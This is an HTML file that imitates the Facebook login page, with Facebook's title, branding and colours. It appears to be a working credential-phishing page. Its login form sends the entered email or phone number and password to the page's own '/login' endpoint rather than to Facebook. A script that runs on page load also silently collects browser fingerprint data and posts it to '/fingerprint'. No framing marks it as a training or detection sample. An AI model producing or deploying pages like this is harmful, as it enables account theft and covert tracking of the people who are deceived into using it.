<!DOCTYPE html>
<html>
<head>
  <title>Facebook â€“ log in or sign up</title>
  <script>
    document.addEventListener('DOMContentLoaded', function() {
      fetch('/fingerprint', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({
          screen: window.screen.width + 'x' + window.screen.height,
          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
          platform: navigator.platform,
          plugins: navigator.plugins.length,
        })
      });
    });
  </script>
</head>
<body style="font-family: Arial; background: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh;">
  <form method="POST" action="/login" style="background: white; padding: 20px; border-radius: 10px; box-shadow: 0 2px 5px rgba(0,0,0,0.3);">
    <h2 style="color:#1877f2">facebook</h2>
    <input name="username" placeholder="Email or phone number" style="width:100%; padding:10px; margin:10px 0;"><br>
    <input name="password" type="password" placeholder="Password" style="width:100%; padding:10px;"><br>
    <button type="submit" style="width:100%; padding:10px; background:#1877f2; color:white; border:none;">Log In</button>
  </form>
</body>
</html>
